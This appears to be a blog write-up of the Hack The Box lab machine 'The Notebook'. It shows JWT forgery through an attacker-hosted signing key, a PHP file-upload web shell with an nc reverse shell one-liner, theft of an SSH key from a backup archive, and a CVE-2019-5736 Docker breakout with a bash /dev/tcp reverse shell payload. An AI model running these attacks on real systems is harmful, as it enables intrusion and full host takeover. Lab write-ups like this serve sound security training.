---
layout: default
---
 <html>
<head>
<style>
h1 {text-align: center;}

</style>
</head>

</html> 

# The Notebook from Hack the box


![TheNotebook info card](assets/theNotebookinfo.jpg)

## NMAP SCAN

Our initial nmap scan shows ports 22, 80 and 10010 open on the machine. 

{% highlight bash  %}
$ nmap -sC -sV -oA thenotebook 10.10.10.230   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 12:52 EDT
Nmap scan report for 10.10.10.230
Host is up (0.030s latency).
Not shown: 997 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.65 seconds

{% endhighlight %}

## WEB FOOTPRINTING PORT 80
We visit http://10.10.10.230/ and run gobuster in the background while we manually enumerate the website. 

### Gobuster Results
{% highlight bash %}
$ gobuster dir -w /opt/lists/common.txt -u http://10.10.10.230/       
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.230/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/01 13:41:41 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 403) [Size: 9]
/login                (Status: 200) [Size: 1250]
/logout               (Status: 302) [Size: 209] [--> http://10.10.10.230/]
/register             (Status: 200) [Size: 1422]                          
                                                                          
===============================================================
2021/08/01 13:42:01 Finished
===============================================================

{% endhighlight %}

### Manual website Enumeration

Visiting http://10.10.10.230 we see the home address of a notebook service and a welcome message that encourages us to create an account.

![TheNotebook info card](assets/notebookhome1.png)

Clicking "Log In" takes us to a sign in screen. Trying some accounts we see that an admin account exists on the web server.

![TheNotebook info card](assets/notebookadmin1.png)

Attempting to login to a random account gives “User doesn't exist.” We didn't get this error when we attempted to log in as admin. This suggest that admin is a valid account. 

![TheNotebook info card](assets/notebookrandom1.png)

Guessing a few passwords for admin doesn't yield access.  We create an account by clicking the register link. 

![TheNotebook info card](assets/notebookreg1.png)

We successfully create an account and are taken to a new home screen.

![TheNotebook info card](assets/notebooktesthome.png)

Our account has the ability to create notes and view notes that we have created.  Nothing interesting is observed directly from the web site while logged in as test123. 

Intercepting our traffic in burp we see our authentication is being handled with a JSON Web Token (JWT).

![TheNotebook info card](assets/notebookburp1.png)

Let's write a jwt decoder in python.

### decodeJWT.py (python3)
{% highlight python %}
import base64
import sys

# Takes jwt from command line and prints base64url decoded output of header and payload
# Example:  
# $ python decodeJWT.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QxMjMiLCJlbWFpbCI6InRlc3QxMjNAdGVzdC5odGIiLCJhZG1pbl9jYXAiOmZhbHNlfQ.JT09otvimuIJkVDIfFjZCh1d0ABsFkbbX8neU1vOwqCfw0hs_PZvvafpVLGnhsSnCiwIwUAO3bvox8KbGitDvy7fAxN_Feb0aIFwg9tzg1rur5wkD6F82bWRPrFl0ngQxgEYKkFAQsd7VG4LWl6Wy3PFJAsSUibj_-k1o7uZlc4Hksq1L54glspZeN_z6r-0AW9sLFJVFq8tgTvhb_IEMIKhWn2OUbggacMHsR8IbfaMJ29nEh-nhn6NUqONBXJA_RD9y9KBfK3hrfQSRZGBtaMt3ZBDG11IQ7MgaaFITTGRyLFVlAEyTYw2NOxcI9FsOtXWCEaMY0uuLxbyT0SASX5qv2t3kVCnBIQZPG0VMVoqiHDSgwPHS5adBHWXtmKTrN0VbeBVMdXYanWxfVmzNXfd6LfAoCOH0AIMpEzTZjuDvB3uBxQ8Yi_VDKygVin6yqsvoKgqmGb6HK_kfmvxmdmPpRq1EZD4O3TlJlbOSa7TZCbssc05cfO212HLvq-cL98I8HJ2ALdL0iIzJpM2KBCL7gp5dSbwrwUTgmncv48sANIrG0yEPAMqwrdlzyvVfKhjA-OW5S54gJx1kkirEU22XPH8pi96-xnCNoxrWhsvcUebVGyiaUIpBZk-9k9oqoEVUohN2dUzejsR0gFCThulxANLd-rZJIK0DdK8fek"

#get jwt from the commandline
jwtCode =sys.argv[1]

#base64urlDecode handles padding error resulting from jwt droping padding for the encoded text.  This function simply adds padding if needed.
def base64urlDecode(x):
    return base64.urlsafe_b64decode(x +'='*(4 - len(x)% 4)).decode('ascii')

#Header is located between the start of jwt and first period of the encrypted string
jwtEncHead=jwtCode[:jwtCode.find(".")]
#Payload is loacated between the first and second period of the encrypted string
jwtEncPay=jwtCode[jwtCode.find(".")+1:jwtCode.find(".",jwtCode.find(".")+1)]

print(base64urlDecode(jwtEncHead))
print (base64urlDecode(jwtEncPay))


{% endhighlight %}

Useing decodeJWT.py to decode the jwt for user test123.
{% highlight bash %}
$ python decodeJWT.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QxMjMiLCJlbWFpbCI6InRlc3QxMjNAdGVzdC5odGIiLCJhZG1pbl9jYXAiOmZhbHNlfQ.JT09otvimuIJkVDIfFjZCh1d0ABsFkbbX8neU1vOwqCfw0hs_PZvvafpVLGnhsSnCiwIwUAO3bvox8KbGitDvy7fAxN_Feb0aIFwg9tzg1rur5wkD6F82bWRPrFl0ngQxgEYKkFAQsd7VG4LWl6Wy3PFJAsSUibj_-k1o7uZlc4Hksq1L54glspZeN_z6r-0AW9sLFJVFq8tgTvhb_IEMIKhWn2OUbggacMHsR8IbfaMJ29nEh-nhn6NUqONBXJA_RD9y9KBfK3hrfQSRZGBtaMt3ZBDG11IQ7MgaaFITTGRyLFVlAEyTYw2NOxcI9FsOtXWCEaMY0uuLxbyT0SASX5qv2t3kVCnBIQZPG0VMVoqiHDSgwPHS5adBHWXtmKTrN0VbeBVMdXYanWxfVmzNXfd6LfAoCOH0AIMpEzTZjuDvB3uBxQ8Yi_VDKygVin6yqsvoKgqmGb6HK_kfmvxmdmPpRq1EZD4O3TlJlbOSa7TZCbssc05cfO212HLvq-cL98I8HJ2ALdL0iIzJpM2KBCL7gp5dSbwrwUTgmncv48sANIrG0yEPAMqwrdlzyvVfKhjA-OW5S54gJx1kkirEU22XPH8pi96-xnCNoxrWhsvcUebVGyiaUIpBZk-9k9oqoEVUohN2dUzejsR0gFCThulxANLd-rZJIK0DdK8fek"
{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}
{"username":"test123","email":"test123@test.htb","admin_cap":false}
{% endhighlight %}


## Exploit JWT
We can see the jwt contains our username “test123." We also see the encryption algorithm for the jwt is RS256.  We see the private key used to verify the signature of the jwt is hosted locally on the remote server. If we created our own jwt and changed the username to admin the server would reject it because we currently don't have a way to encrypt our jwt signature with the private key. We can however, change the kid variable to point to a private key that we create and serve on our own web server. 

### Step 1) Create our own private key

{% highlight bash %}
$ openssl genrsa -out myprivatekey.pem 512              
Generating RSA private key, 512 bit long modulus (2 primes)
{% endhighlight %}

### Step 2) Set up a web server hosting the private key

{% highlight bash %}
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
{% endhighlight %}

### Step 3) Use the private key to sign our own jwt.  
Note the changes to the kid, username, and admin_cap variables.
We chose the username to be admin, because we found admin to be a valid account during web footprinting.
### makeJWT.py (python 3)
{% highlight python%}
import rsa
import base64


def base64urlEncode(x):
    return base64.urlsafe_b64encode(x).decode('ascii').replace('=','')

decHeader =b'{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.12/myprivatekey.pem"}'
decPayload =b'{"username":"admin","email":"test123@test.htb","admin_cap":true}'
jwtHeader=base64urlEncode(decHeader)
jwtPayload=base64urlEncode(decPayload)

jwt=jwtHeader+"."+jwtPayload

with open('myprivatekey.pem', mode='rb') as privatefile:
    keydata = privatefile.read()
privkey=rsa.PrivateKey.load_pkcs1(keydata)

jwtSignature=base64urlEncode(rsa.sign(jwt.encode(), privkey, 'SHA-256'))
jwt=jwt+"."+jwtSignature
print(jwt)
{% endhighlight %}

Run makeJWT.py to generate our jwt.

{% highlight bash %}
$ python3 makeJWT.py
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMi9teXByaXZhdGVrZXkucGVtIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZW1haWwiOiJ0ZXN0MTIzQHRlc3QuaHRiIiwiYWRtaW5fY2FwIjp0cnVlfQ.WjMZ8nsFL4dRuLZTHer90tgwpBFTCI3Kt6EQcvzamCZ2qh1Mx0eu3Kq9WrgegBRmiUgDNOYO3WQ7d2Io-tnGuQ
{% endhighlight %}

Open cookie manager in the web browser and paste in our newly created jwt in place of our old jwt.  Cookie manager is a firefox add on. 

![TheNotebook info card](assets/notebookcoo1.png)

Open Cookie Manager for the current page.

![TheNotebook info card](assets/notebookcoo2.png)

Click edit on auth.

![TheNotebook info card](assets/notebookcoo3.png)

Change the value to our created jwt and click save

![TheNotebook info card](assets/notebookcoo4.png)

Refresh home page and we see we have successfully logged in as admin!

![TheNotebook info card](assets/notebookadmin2.png)

We also see that the remote host pulled our private key from our web server to verify the signature of the jwt we created. This will happen every time we access a page on the server using our new jwt.

{% highlight bash %}
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.230 - - [03/Aug/2021 14:10:07] "GET /myprivatekey.pem HTTP/1.1" 200 -
{% endhighlight %}

## Foothold
Navigate to Notes we see some important hints. The first hint tells us that uploaded php files are executing.  This is how we will obtain a foothold.  We also see that backups are on the server.  This hint will help us get user. 

### Admin notes
![TheNotebook info card](assets/notebooknote1.png)

### Need to fix config note
![TheNotebook info card](assets/notebooknote2.png)

### Backups are scheduled note
![TheNotebook info card](assets/notebooknote3.png)

Visiting the Admin Panel we see we have the ability to upload a file.  Let’s upload test.php to test for code execution as the hint from the notes suggest.  

### test.php
{% highlight php %}
<?php system('whoami')?>
{% endhighlight %}

Navigate to the Admin Panel then select Upload File. 

![TheNotebook info card](assets/notebookupload1.png)

Upload test.php

![TheNotebook info card](assets/notebookupload2.png)

Save and click view

![TheNotebook info card](assets/notebookupload3.png)

Success!

![TheNotebook info card](assets/notebookupload4.png)

Let's use a reverse shell one-liner from the reverse shell cheat sheet to get a reverse shell on the box.

### shell.php
{% highlight php %}
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 7575>/tmp/f')?>
{% endhighlight %}

Set up a nc listner on port 7575

{% highlight bash %}
$ nc -lvnp 7575            
listening on [any] 7575 ...
{% endhighlight %}

Upload and visit shell.php the same way we did with test.php.

Sucess!
{% highlight bash %}
$ nc -lvnp 7575            
listening on [any] 7575 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.230] 46698
/bin/sh: 0: can't access tty; job control turned off
$ 
{% endhighlight %}

## User 

First we get a proper shell.

{% highlight bash %}
$ nc -lvnp 7575            
listening on [any] 7575 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.230] 46698
/bin/sh: 0: can't access tty; job control turned off
$ which python
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
www-data@thenotebook:~/html$ ^Z
zsh: suspended  nc -lvnp 7575
$ stty raw -echo; fg % 1                                   148 ⨯ 1 ⚙
[1]  + continued  nc -lvnp 7575
                               export TERM=screen
www-data@thenotebook:~/html$ 
{% endhighlight %}

Manually enumerating the box we don’t see anything in /var/www/html.  From the second hint in the admin notes we check /var/backups and see home.tar.gz.  We also see a user account for noah.

{% highlight bash %}
www-data@thenotebook:~/html$ ls -la
total 8
drwxr-xr-x 2 root     www-data 4096 Aug  3 19:55 .
drwxr-xr-x 5 www-data www-data 4096 Aug  3 16:34 ..
www-data@thenotebook:~/html$ cd ../../
www-data@thenotebook:/var$ ls -la
total 56
drwxr-xr-x 14 root     root     4096 Feb 12 06:52 .
drwxr-xr-x 24 root     root     4096 Jul 23 14:28 ..
drwxr-xr-x  2 root     root     4096 Aug  3 15:37 backups
drwxr-xr-x 10 root     root     4096 Feb 12 06:25 cache
drwxrwxrwt  2 root     root     4096 Aug  6  2020 crash
drwxr-xr-x 39 root     root     4096 Feb 23 08:58 lib
drwxrwsr-x  2 root     staff    4096 Apr 24  2018 local
lrwxrwxrwx  1 root     root        9 Aug  6  2020 lock -> /run/lock
drwxrwxr-x  6 root     syslog   4096 Aug  3 15:37 log
drwxrwsr-x  2 root     mail     4096 Aug  6  2020 mail
drwxr-xr-x  2 root     root     4096 Aug  6  2020 opt
lrwxrwxrwx  1 root     root        4 Aug  6  2020 run -> /run
drwxr-xr-x  2 root     root     4096 Jul 10  2020 snap
drwxr-xr-x  4 root     root     4096 Aug  6  2020 spool
drwxrwxrwt  3 root     root     4096 Aug  3 20:39 tmp
drwxr-xr-x  5 www-data www-data 4096 Aug  3 16:34 www
www-data@thenotebook:/var$ cd backups/
www-data@thenotebook:/var/backups$ ls -la
total 64
drwxr-xr-x  2 root root  4096 Aug  3 15:37 .
drwxr-xr-x 14 root root  4096 Feb 12 06:52 ..
-rw-r--r--  1 root root 33585 Jul 23 14:24 apt.extended_states.0
-rw-r--r--  1 root root  3618 Feb 24 08:53 apt.extended_states.1.gz
-rw-r--r--  1 root root  3609 Feb 23 08:58 apt.extended_states.2.gz
-rw-r--r--  1 root root  3621 Feb 12 06:52 apt.extended_states.3.gz
-rw-r--r--  1 root root  4373 Feb 17 09:02 home.tar.gz
{% endhighlight %}

Let's move home.tar.gz to our local machine.

![TheNotebook info card](assets/notebookmove1.png)

Unzipping home.tar.gz we obtain a working ssh key for the user account Noah!

{% highlight bash %}
$ ls
backup  home.tar.gz  http10.10.10.230  jwtCodes  shell.php  thenotebook.gnmap  thenotebook.nmap  thenotebook.xml
$ tar -xf home.tar.gz 
$ ls
backup  home  home.tar.gz  http10.10.10.230  jwtCodes  shell.php  thenotebook.gnmap  thenotebook.nmap  thenotebook.xml
$ cd home
$ ls
noah
$ cd noah 
$ ls -la
total 32
drwxr-xr-x 5 kali kali 4096 Feb 17 04:02 .
drwxr-xr-x 3 kali kali 4096 Feb 12 01:24 ..
-rw-r--r-- 1 kali kali  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kali kali 3771 Apr  4  2018 .bashrc
drwx------ 2 kali kali 4096 Feb 16 05:47 .cache
drwx------ 3 kali kali 4096 Feb 12 01:25 .gnupg
-rw-r--r-- 1 kali kali  807 Apr  4  2018 .profile
drwx------ 2 kali kali 4096 Feb 17 03:59 .ssh
$ cd .ssh
$ ls    
authorized_keys  id_rsa  id_rsa.pub
$ chmod 600 id_rsa
$ ssh -i id_rsa noah@10.10.10.230
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug  3 20:42:50 UTC 2021

  System load:  0.0               Processes:              200
  Usage of /:   45.9% of 7.81GB   Users logged in:        1
  Memory usage: 19%               IP address for ens160:  10.10.10.230
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


137 packages can be updated.
75 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Aug  3 20:35:05 2021 from 10.10.14.12
noah@thenotebook:~$ whoami
noah
noah@thenotebook:~$ id
uid=1000(noah) gid=1000(noah) groups=1000(noah)
noah@thenotebook:~$ cat user.txt |wc
      1       1      33
noah@thenotebook:~$ 
{% endhighlight %}

## Root
Running sudo -l we see we can run commands in the weapp-dev01 container with elevated privileges.

{% highlight bash %}
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
{% endhighlight %}

Googling what we can do, we find an article on hacktricks suggesting trying CVE-2019-5736 based on our ability to run exec with docker. 
https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout

We find a POC for the exploit here
https://github.com/Frichetten/CVE-2019-5736-PoC
Using the POC in the previous link, we make one modification to the payload variable to get a reverse shell.  
Below is a portion of the POC with the modified payload variable. 

{% highlight go %}
//<--snip-->


// This is the line of shell commands that will execute on the host
var payload = "#!/bin/bash \n bash -i >& /dev/tcp/10.10.14.12/9652 0>&1"

func main() {
        // First we overwrite /bin/sh with the /proc/self/exe interpreter path
        fd, err := os.Create("/bin/sh")


//<--snip-->
{% endhighlight %}

Next we build the poc and host it on our web server on our local machine.

{% highlight bash %}
$ go build 
$ ls
cve-2019-5736  main.go
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
{% endhighlight %}

We also set up nc listening on port 9652 on our local machine.

{% highlight bash %}
$ nc -lvnp 9652
listening on [any] 9652 ...
{% endhighlight %}

To use the POC we will log in twice with the noah rsa key. With one session we will download and execute the POC inside the container. This will overwrite /bin/sh within the container. With the second session we will execute /bin/sh within the container thus triggering our reverse shell.

### Step 1) From the first noah session download and execute the POC in the container.
{% highlight bash %}
noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
root@a99f1db42470:/opt/webapp# cd /root
root@a99f1db42470:~# wget http://10.10.14.7/cve-2019-5736
--2021-08-07 01:20:20--  http://10.10.14.7/cve-2019-5736
Connecting to 10.10.14.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2236814 (2.1M) [application/octet-stream]
Saving to: ‘cve-2019-5736’

cve-2019-5736     100%[=============================>]   2.13M   333KB/s    in 6.4s    

2021-08-07 01:20:27 (339 KB/s) - ‘cve-2019-5736’ saved [2236814/2236814]

root@a99f1db42470:~# chmod +x cve-2019-5736 
root@a99f1db42470:~# ./cve-2019-5736 
[+] Overwritten /bin/sh successfully
[+] Found the PID: 59
[+] Successfully got the file handle
[+] Successfully got write handle &{0xc0000ad140}
{% endhighlight %}

### Step 2) From the second noah session use exec to execute /bin/sh within the container
{% highlight bash %}
noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
No help topic for '/bin/sh'
{% endhighlight %}

We now see our nc listener receive a shell with root privileges.
{% highlight bash %}
$ nc -lvnp 9652
listening on [any] 9652 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.230] 39034
bash: cannot set terminal process group (6968): Inappropriate ioctl for device
bash: no job control in this shell
<894a9208c7b22d12c70a8b221338ac1c22fa8de382325d145# cd /root
cd /root
root@thenotebook:/root# ls
ls
cleanup.sh
docker-runc
reset.sh
root.txt
start.sh
root@thenotebook:/root# cat root.txt |wc
cat root.txt |wc
      1       1      33
root@thenotebook:/root# id         
id
uid=0(root) gid=0(root) groups=0(root)
root@thenotebook:/root# 
{% endhighlight %}















